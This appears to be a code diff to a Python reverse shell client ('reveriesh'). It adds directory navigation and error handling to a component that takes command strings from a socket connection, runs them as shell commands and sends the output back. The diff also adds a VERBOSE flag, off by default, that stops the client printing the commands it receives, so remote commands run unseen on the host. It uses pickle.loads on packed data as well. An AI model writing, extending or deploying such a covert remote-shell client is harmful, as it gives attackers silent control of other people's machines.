@@ -17,6 +17,8 @@ from pprint import pprint
 from reveriesh.common import SIG_REVERIESH, ascii_format
 
 
+VERBOSE=False
+
 ## Doesn't work right
 # def start_client(host, port=80):
 #     if host is None:
@@ -39,6 +41,8 @@ class ShellRunner(object):
             return ShellRunner.cd(commandstr[3:])
         if commandstr[:2] == 'to':
             return ShellRunner.to(commandstr[3:])
+        if commandstr[:2] == '..':
+            return ShellRunner.dotdot()
 
         if len(data) == 0:
             return ShellRunner.fmt_prompt()
@@ -47,23 +51,38 @@ class ShellRunner(object):
 
     @staticmethod
     def cd(dirname):
-        os.chdir(dirname)
-        return ShellRunner.pack_dict()
+        try:
+            os.chdir(dirname)
+            return ShellRunner.pack_dict()
+        except Exception as exc:
+            return ShellRunner.pack_dict(err=str(exc).encode())
 
     @staticmethod
     def to(dirname):
-        os.chdir(dirname)
+        data = ShellRunner.cd(dirname)
+        info = pickle.loads(data)
+        if info.get('err', None):
+            return data
+
         return ShellRunner.run_cmd('ls')
 
     @staticmethod
-    def run_cmd(commandstr, verbose=True):
+    def dotdot():
+        return ShellRunner.to('..')
+
+    @staticmethod
+    def run_cmd(commandstr, verbose=VERBOSE):
         # cmd = subprocess.Popen(shlex.split(commandstr),
         #                        shell=True,
         #                        stdout=subprocess.PIPE,
         #                        stderr=subprocess.PIPE)
         # out = cmd.stdout.read()
         # err = cmd.stderr.read()
-        info = ubelt_cmd(commandstr)
+        try:
+            info = ubelt_cmd(commandstr)
+        except Exception as exc:
+            return ShellRunner.pack_dict(err=str(exc).encode())
+
         err = info['err'].encode()
         out = info['out'].encode()
 
@@ -145,7 +164,8 @@ class ReverseShellClient(object):
         if data == SIG_REVERIESH.PROMPT:
             self.sock.send(ShellRunner.pack_dict())
             return True
-        print(ascii_format(data.decode(), 100))
+        if VERBOSE:
+            print(ascii_format(data.decode(), 100))
         infodata = ShellRunner.cmd(data)
         self.sock.send(infodata)
         return True
